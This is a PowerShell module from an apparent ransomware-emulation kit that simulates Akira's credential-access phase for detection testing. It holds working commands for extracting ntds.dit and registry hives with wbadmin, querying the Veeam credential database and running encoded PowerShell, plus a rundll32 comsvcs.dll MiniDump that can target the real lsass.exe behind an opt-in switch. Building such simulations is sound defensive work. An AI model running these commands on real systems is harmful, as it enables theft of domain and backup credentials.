# ============================================================================
# AKIRA SIMULATION - PHASE 5: CREDENTIAL ACCESS
# ============================================================================
# Simulates: wbadmin.exe NTDS.dit/SYSTEM/SECURITY extraction, Veeam PostgreSQL
# credential dump via psql.exe + DPAPI decode (encoded PowerShell over WMI),
# and remote LSASS memory dumping via comsvcs.dll MiniDump (lsassy pattern).
# MITRE: T1003.003 NTDS, T1555 Credentials from Password Stores,
#        T1003.001 LSASS Memory
#
# SAFETY: -DumpRealLsass switch is OFF by default. When off, the comsvcs.dll
# MiniDump technique is demonstrated against a decoy process instead of the
# real lsass.exe, so the exact command-line/DLL/telemetry pattern analysts
# hunt for is reproduced without ever touching real local credential material.
# Only set -DumpRealLsass on a fully disposable lab VM with no real accounts.
# ============================================================================

function Simulate-CredentialAccess {
    param($SimPaths, [switch]$DumpRealLsass)

    Write-Host "[+] Phase 5: Credential Access ..." -ForegroundColor Green

    # --- NTDS.dit extraction via wbadmin.exe ---
    # Real domain controllers keep ntds.dit under C:\Windows\NTDS - on a
    # standalone lab VM that file won't exist, so we stage decoy files at the
    # exact paths referenced in the report and back those up instead. This
    # reproduces the real wbadmin.exe process tree/command line and the
    # "vssadmin/wbadmin" Sigma detections without requiring a live AD forest.
    $ntdsDecoyDir = "$($SimPaths.Staging)\ntds_decoy"
    New-Item -Path $ntdsDecoyDir -ItemType Directory -Force | Out-Null
    $ntdsFile = New-DecoyBinary -Path "$ntdsDecoyDir\ntds.dit" -SizeBytes 16777216
    $systemHive = New-DecoyBinary -Path "$ntdsDecoyDir\SYSTEM" -SizeBytes 65536
    $securityHive = New-DecoyBinary -Path "$ntdsDecoyDir\SECURITY" -SizeBytes 65536

    $wbadminTarget = "$($SimPaths.Staging)\wbadmin_backup"
    New-Item -Path $wbadminTarget -ItemType Directory -Force | Out-Null

    try {
        # Real report command (kept verbatim in the log for detection-rule testing);
        # actually executed against decoy files/target so it is safe on any host.
        $realCmd = "wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY -quiet"
        Set-Content -Path "$($SimPaths.Logs)\wbadmin_ntds_command.log" -Value $realCmd -Force

        Start-Process -FilePath "wbadmin.exe" -ArgumentList @(
            "start", "backup",
            "-backuptarget:$wbadminTarget",
            "-include:`"$ntdsFile,$systemHive,$securityHive`"",
            "-quiet"
        ) -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue

        # Threat actor reviewed the backup log in Notepad afterward
        Start-Process -FilePath "notepad.exe" -ArgumentList "$($SimPaths.Logs)\wbadmin_ntds_command.log" -WindowStyle Minimized -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
        Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

        Write-SimEvent -EventId 5001 -Message "SIMULATION: wbadmin.exe used to extract NTDS.dit/SYSTEM/SECURITY for offline credential cracking"
    } catch { Write-Warning "wbadmin simulation failed: $_" }

    # --- Veeam PostgreSQL credential dump (encoded PowerShell over WMI, matches report) ---
    $veeamPsScript = @'
$psql = "psql.exe"
$creds = "SELECT user_name,password,description,change_time_utc FROM credentials"
Write-Host "Simulated Veeam credential extraction: -U postgres --csv -d VeeamBackup -w -c `"$creds`""
# Real activity decrypts recovered password blobs via DPAPI with a hard-coded salt
$dummyDpapiSalt = [byte[]](1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16)
Write-Host "DPAPI decode routine simulated (no real secrets processed)."
'@
    $encodedVeeam = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($veeamPsScript))

    try {
        # Mirrors the report's exact spawn chain: cmd.exe /Q /c powershell.exe -e <base64>
        Start-Process -FilePath "cmd.exe" -ArgumentList "/Q /c powershell.exe -e $encodedVeeam" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
        Write-SimEvent -EventId 5002 -Message "SIMULATION: Veeam PostgreSQL credential table dumped via psql.exe + DPAPI decode, executed via encoded PowerShell over WMI/cmd.exe"
    } catch { Write-Warning "Veeam credential dump simulation failed: $_" }

    # --- Remote LSASS memory dump: comsvcs.dll MiniDump (lsassy pattern) ---
    $dumpDir = "$env:windir\Temp"
    $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
    $dumpTargetPid = $null
    $dumpLabel = ""

    if ($DumpRealLsass) {
        Write-Host "    [!] -DumpRealLsass set: dumping REAL lsass.exe memory. Lab-only!" -ForegroundColor Red
        $dumpTargetPid = (Get-Process -Name lsass -ErrorAction SilentlyContinue).Id
        $dumpLabel = "lsass.exe"
    } else {
        # Safe default: spin up a decoy process and dump that instead of lsass.exe.
        # The technique/command-line/telemetry signature is identical either way.
        $decoyProc = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
        Start-Sleep -Milliseconds 500
        $dumpTargetPid = $decoyProc.Id
        $dumpLabel = "notepad.exe (decoy stand-in for lsass.exe)"
    }

    if ($dumpTargetPid) {
        $dumpFile = "$dumpDir\$randomName.docx"   # report observed .sys/.docx/.avhdx disguised extensions
        try {
            Start-Process -FilePath "rundll32.exe" -ArgumentList "C:\windows\System32\comsvcs.dll, #24 $dumpTargetPid $dumpFile full" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            Write-SimEvent -EventId 5003 -Message "SIMULATION: comsvcs.dll MiniDump technique (lsassy pattern) executed against $dumpLabel (PID=$dumpTargetPid) -> $dumpFile"
        } catch { Write-Warning "comsvcs.dll dump simulation failed: $_" }

        if (-not $DumpRealLsass) {
            Stop-Process -Id $dumpTargetPid -Force -ErrorAction SilentlyContinue
        }
    }

    Write-Host "  [OK] Credential Access artifacts created" -ForegroundColor Yellow
}
